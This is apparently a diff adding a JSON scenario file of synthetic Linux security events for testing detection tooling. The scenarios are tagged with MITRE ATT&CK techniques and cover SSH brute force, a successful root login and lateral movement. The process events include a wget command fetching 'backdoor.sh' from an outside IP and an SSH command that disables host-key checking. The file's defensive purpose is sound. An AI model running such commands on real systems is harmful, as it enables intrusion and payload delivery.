@@ -1,0 +1,111 @@
+[
+  {
+    "name": "SSH Brute Force - External Attackers",
+    "delay": 0.02,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_auth",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "sshd",
+        "log_message": "Failed password for root from 45.33.32.156 port 22 ssh2",
+        "severity": "warning",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Credential Access",
+          "technique_id": "T1110.001",
+          "technique_name": "Brute Force: Password Guessing"
+        },
+        "is_malicious": true,
+        "killchain_phase": "credential-access",
+        "multiply": 20
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_auth",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "sshd",
+        "log_message": "Failed password for invalid user admin from 45.33.32.156 port 22 ssh2",
+        "severity": "warning",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "multiply": 10,
+        "killchain_phase": "credential-access"
+      }
+    ]
+  },
+  {
+    "name": "SSH Brute Force - Password Spray Success",
+    "delay": 0.5,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_auth",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "sshd",
+        "log_message": "Accepted password for root from 45.33.32.156 port 22 ssh2",
+        "severity": "notice",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Initial Access",
+          "technique_id": "T1078.002",
+          "technique_name": "Valid Accounts: Domain Accounts"
+        },
+        "is_malicious": true,
+        "killchain_phase": "initial-access"
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_auth",
+        "pid": "{{RANDOM_PID}}",
+        "proc": "sshd",
+        "log_message": "pam_unix(sshd:session): session opened for user root by (uid=0)",
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "killchain_phase": "initial-access"
+      }
+    ]
+  },
+  {
+    "name": "Post-Exploitation - Lateral Movement via SSH",
+    "delay": 2.0,
+    "events": [
+      {
+        "source": "linux",
+        "event_type": "linux_process",
+        "pid": "{{RANDOM_PID}}",
+        "ppid": 1,
+        "exe": "/usr/bin/ssh",
+        "args": "ssh -o StrictHostKeyChecking=no root@10.0.0.15",
+        "user": "root",
+        "uid": 0,
+        "gid": 0,
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Lateral Movement",
+          "technique_id": "T1021.004",
+          "technique_name": "Remote Services: SSH"
+        },
+        "is_malicious": true,
+        "killchain_phase": "lateral-movement"
+      },
+      {
+        "source": "linux",
+        "event_type": "linux_process",
+        "pid": "{{RANDOM_PID}}",
+        "ppid": 1,
+        "exe": "/usr/bin/wget",
+        "args": "wget -O /tmp/backdoor.sh http://45.33.32.156/payload.sh",
+        "user": "root",
+        "uid": 0,
+        "gid": 0,
+        "hostname": "{{RANDOM_LINUX_HOST}}",
+        "mitre": {
+          "tactic": "Command and Control",
+          "technique_id": "T1105",
+          "technique_name": "Ingress Tool Transfer"
+        },
+        "is_malicious": true,
+        "killchain_phase": "command-and-control"
+      }
+    ]
+  }
+]
